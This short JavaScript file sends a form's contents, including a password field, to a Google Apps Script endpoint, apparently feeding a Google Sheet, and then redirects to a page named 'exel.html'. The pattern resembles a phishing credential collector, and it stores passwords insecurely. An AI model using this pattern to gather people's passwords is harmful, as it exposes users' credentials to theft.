// script.js
const scriptURL = 'https://script.google.com/macros/s/AKfycbxHdxYtnFHRHdAbjLiUQ0d_IBgC0GWgEVxa5he79_kWmk_g6k1LSSjzJga26p2DUqfLRg/exec'
const form = document.getElementById('submit-to-google-sheet');

form.addEventListener('submit', e => {
  e.preventDefault();
  fetch(scriptURL, { method: 'POST', body: new FormData(form) })
    .then(response => console.log('Success!', response))
    .catch(error => console.error('Error!', error.message));
});

function validateForm() {
  var name = document.getElementById('name').value;
  var password = document.getElementById('password').value;

  if (name.trim() === '' || password.trim() === '') {
    alert('please fill in all required fields (name and password).');
    return false;
  } else {
    window.location.href = 'exel.html';
    return false;
  }
}